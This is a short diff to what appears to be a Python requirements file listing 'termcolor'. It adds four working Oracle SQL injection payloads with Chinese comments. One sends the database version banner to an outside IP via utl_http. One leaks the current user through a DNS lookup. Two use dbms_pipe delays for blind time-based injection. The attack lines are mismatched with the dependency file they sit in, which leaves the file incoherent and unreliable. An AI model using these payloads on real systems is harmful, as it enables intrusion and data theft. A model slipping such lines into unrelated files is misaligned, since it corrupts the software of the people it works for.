@@ -1,1 +1,5 @@
 termcolor
+and 1=utl_http.request('http://172.96.190.73:80/'||(select banner from sys.v_$version where rownum=1))
+and 1=utl_inaddr.get_host_name((select user from dual))-- //查询当前用户
+and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',5),0) from dual) --延迟注入
+and 1=dbms_pipe.receive_message('RDS', 10)-- bool
